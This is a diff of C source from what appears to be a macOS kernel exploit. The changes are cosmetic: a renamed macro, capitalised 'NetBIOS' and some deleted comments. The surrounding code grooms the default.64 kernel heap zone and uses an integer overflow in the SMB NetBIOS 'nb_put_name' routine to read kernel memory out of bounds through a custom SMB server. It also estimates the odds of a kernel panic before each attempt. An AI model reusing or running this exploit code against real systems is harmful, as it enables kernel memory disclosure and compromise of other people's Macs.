@@ -40,24 +40,21 @@
 #define CUTOFF_PROBABILITY 0.95
 #define NUM_KEXT_64_PAD_START_PAGES 32
 #define NUM_KEXT_64_ELEMENTS_PER_GAP 7
-#define NUM_KEXT_64_READ_SLOTS (xpl_PAGE_SIZE / 64 * 64)
+#define NUM_KEXT_64_READ_SLOTS (XPL_PAGE_SIZE / 64 * 64)
 #define NUM_KEXT_64_FRAGMENTED_PAGES 64
 #define NUM_KEXT_64_PAD_END_PAGES 8
 
 
 xpl_allocator_nrnw_t xpl_oob_reader_ovf_fragment_default_64(const struct sockaddr_in* smb_addr) {
-    /// The allocations made by `xpl_allocator_nrnw` are made on zones from `KHEAP_KEXT`
-    /// As of macOS 12.3, both `KHEAP_DEFAULT` and `KHEAP_KEXT` uses same zones.
-    /// So these allocations will be done on default.64 zone
     xpl_allocator_nrnw_t gap_allocator = xpl_allocator_nrnw_create(smb_addr);
     xpl_allocator_nrnw_t element_allocator = xpl_allocator_nrnw_create(smb_addr);
     
-    xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_START_PAGES * xpl_PAGE_SIZE / 64);
+    xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_START_PAGES * XPL_PAGE_SIZE / 64);
     for (int i=0; i<NUM_KEXT_64_READ_SLOTS; i++) {
         xpl_allocator_nrnw_allocate(gap_allocator, 64, 1);
         xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_ELEMENTS_PER_GAP);
     }
-    xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_END_PAGES * xpl_PAGE_SIZE / 64);
+    xpl_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_END_PAGES * XPL_PAGE_SIZE / 64);
     
     xpl_allocator_nrnw_destroy(&gap_allocator);
     return element_allocator;
@@ -70,7 +67,7 @@ float xpl_oob_reader_ovf_check(const struct sockaddr_in* smb_addr, uint8_t zone_
     int num_overwritten = ((int)addr_len - 1) / 64;
     
     int total_size = (num_overwritten + 1) * 64;
-    /// Length of netbios name first segment data required to read all the overwritten elements
+    /// Length of NetBIOS name first segment data required to read all the overwritten elements
     /// in default.64
     uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
     xpl_assert_cond(total_size, <=, UINT8_MAX);
@@ -100,8 +97,8 @@ float xpl_oob_reader_ovf_check(const struct sockaddr_in* smb_addr, uint8_t zone_
             dispatch_semaphore_signal(sem);
         });
         
-        /// Due to the integer overflow in `nb_put_name` method, if any of the netbios
-        /// segment data length is 255, then `nb_put_name` method will never return
+        /// Due to the integer overflow in `nb_put_name` method, if any of the NetBIOS
+        /// label data length is 255, then `nb_put_name` method will never return
         /// Detect this condition and stop waiting if this happens.
         /// See `poc_snb_name_oob_read` for more details
         if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * 1000000000ULL))) {
@@ -139,7 +136,6 @@ float xpl_oob_reader_ovf_check(const struct sockaddr_in* smb_addr, uint8_t zone_
 
 int xpl_oob_reader_ovf_read_internal(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
     xpl_assert_cond(data_size, <=, zone_size);
-//    xpl_assert_cond(zone_size, >=, 64);
     xpl_assert_cond(zone_size, <, 128);
     
     /// Fragment the default.64 zone. The allocations used for fragmenting the zone are
@@ -148,7 +144,7 @@ int xpl_oob_reader_ovf_read_internal(const struct sockaddr_in* smb_addr, uint8_t
     
     int error = EAGAIN;
     for (int i=0; i<MAX_TRIES; i++) {
-        /// Perform test OOB read on default.64 zones without overflow write to see if
+        /// Perform test OOB read on default.64 zones without OOB write to see if
         /// OOB reads requiring overflow may cause kernel panic
         double probability = xpl_oob_reader_ovf_check(smb_addr, zone_size, zone_size * 2);
         if (probability < CUTOFF_PROBABILITY) {
@@ -171,7 +167,7 @@ int xpl_oob_reader_ovf_read_internal(const struct sockaddr_in* smb_addr, uint8_t
         params.laddr_snb_len = zone_size * 2;
         params.laddr_snb_name_seglen = snb_name_seglen;
         
-        /// Buffer for reading the local netbios name received by xpl_smbx server
+        /// Buffer for reading the local NetBIOS name received by xpl_smbx server
         uint32_t local_nb_name_size = 2048;
         char* local_nb_name = malloc(local_nb_name_size);
         
